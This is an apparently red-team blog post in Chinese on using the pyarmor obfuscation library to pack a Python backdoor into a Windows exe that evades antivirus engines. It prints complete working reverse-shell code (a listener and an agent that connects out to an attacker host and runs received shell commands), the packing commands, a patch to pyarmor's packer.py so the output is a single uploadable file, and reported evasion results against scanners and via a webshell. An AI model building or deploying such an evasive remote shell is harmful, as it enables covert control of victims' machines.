# 一个有趣的python混淆库

## [pyarmor · PyPI](https://pypi.org/project/pyarmor/)


前几天由于红队要准备一些东西，找不到免杀的远控，一时也没有思路，想到以前有人用shellcode`<python>` 打包为`exe`，可以免杀的效果，但是常规shellcode直接打包已经被列入规则库，我想了想从python语言角度上混淆看来下效果，基本常见免杀引擎都可以，满足需求。

`pyarmor`打包混淆原理，其收费版本混淆无规则，开源免费版本硬编码。
Pyarmor 加密和保护 Python 源代码的方法和机制 [pyarmor/protect-python-scripts-by-pyarmor.md at master · dashingsoft/pyarmor · GitHub](https://github.com/dashingsoft/pyarmor/blob/master/docs/zh-cn/protect-python-scripts-by-pyarmor.md)

## 准备工作

一个python tcp服务端和客户端，利用混淆库 打包成windwos exe。

### server.py (tcp后门例子用的是t00ls的帖子)

``` python 
# -*- coding: utf-8 -*-
import socket,subprocess as sp,sys                    # 导入subprocess，socket模块

# 1）监听信息
host = sys.argv[1]                                   # 攻击者地址，通常留空''
port = int(sys.argv[2])                              # 攻击者主机端口

# 2）套接字部分
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 安装套接字
s.bind((host,port))                                  # 绑定套接字
s.listen(100)                                        # 最大连接数:100
conn,addr  = s.accept()                              # 接收客户端连接

# 3）输出连接信息
print "[+] Conection Established from: %s" % (str(addr[0]))
                                                     # 打印攻击者的连接信息
# 4）接收输出
while 1:                                            # 运行死循环初始化反向的连接
    command = raw_input("#> ")                      # 服务器输入
    # 5）if判断-1
    if command != "exit()":                         # 如果命令不是exit()，那就继续执行
        # 6）if判断-2
        if command == "": continue                  # 命令如果为空，循环这个函数
        # 7）发送、接收命令
        conn.send(command)                          # 发送命令到客户端
        result = conn.recv(1024)                    # 接收并输出
        # 8） 处理接收结果
        total_size = long(result[:16])              # 获取返回数据的大小,取出前16位的值
        result = result[16:]                        # 接收数据的结果，取16位之后的值
        # 9） 处理数据
        while total_size > len(result):             # 循环函数
            data = conn.recv(1024)                  # 每次接收1024的数据，如果发送的数据大于现在接收的数据
            result += data                          # 循环接收并且拼接起来
        # 10）打印结果过滤换行符
        print result.rstrip("\n")                   # 过滤掉换行符
    else:
        conn.send("exit()")                         # 发送客户端关闭的消息
        print "[+] shell Going Down"                # 本地退出提示
        break
# 11）出现任何故障关闭套接字
s.close() 
```

### agent.py

``` python 

import socket,subprocess as sp,sys                    


host = sys.argv[1]                                   
port = int(sys.argv[2])                          


conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
conn.connect((host,port))

while 1:
    command = str(conn.recv(1024))

    if command != "exit()":
        sh = sp.Popen(command,shell=True,
                      stdout=sp.PIPE,
                      stderr=sp.PIPE,
                      stdin=sp.PIPE)

        out,err = sh.communicate()   

        result = str(out) + str(err)

        length = str(len(result)).zfill(16)

        conn.send(length + result)
    else:
        break


conn.close()
```
### pyarmor 打包exe

``` bash
pyarmor pack -t PyInstaller project/src/agent.py
```

>常规情况是直接打包为一个exe文件加一些别的dll库文件，而我们正常渗透是不可能上传这些东西上去的，因此分析了下代码，修改pyarmor某处代码，这样打包生成一个文件。
>pyinstaller 打包成一个文件的原理也不是直接所有打包，他运行时需要释放一个缓存目录，运行程序，因此部分测试时生成的exe文件第一次运行没有成功的也是这个原因。


### 免杀效果


在测试的情况下，尝试使用webshell和正常运行均没有影响，且常见杀毒引擎也是不会拦截的
![78989ac9.png](https://raw.githubusercontent.com/LiodAir/images/master/blog/78989ac9.png)

webshell运行情况：
![6c7318da.png](https://raw.githubusercontent.com/LiodAir/images/master/blog/6c7318da.png)

杀毒引擎查杀情况（`这个IKARUS正常python输出helloworld文件也爆，可能对这种混淆方式做了一些处理`）：
![ef0f6c18.png](https://raw.githubusercontent.com/LiodAir/images/master/blog/ef0f6c18.png)



### 使用

>修改pyarmor库某处代码 类似`/usr/local/lib/python3.7/site-packages/pyarmor/packer.py`  187行 修改为 
```bash
options = ['-F', '-y', '--specpath', project]
```
![ddcb3a6e.png](https://raw.githubusercontent.com/LiodAir/images/master/blog/ddcb3a6e.png)


``` bash
pyarmor pack -t PyInstaller project/src/agent.py

更多使用方法：

```
[pyarmor/README-ZH.md at master · dashingsoft/pyarmor · GitHub](https://github.com/dashingsoft/pyarmor/blob/master/src/examples/README-ZH.md)


## 引用

[https://www.t00ls.net/articles-43337.html](https://www.t00ls.net/articles-43337.html)




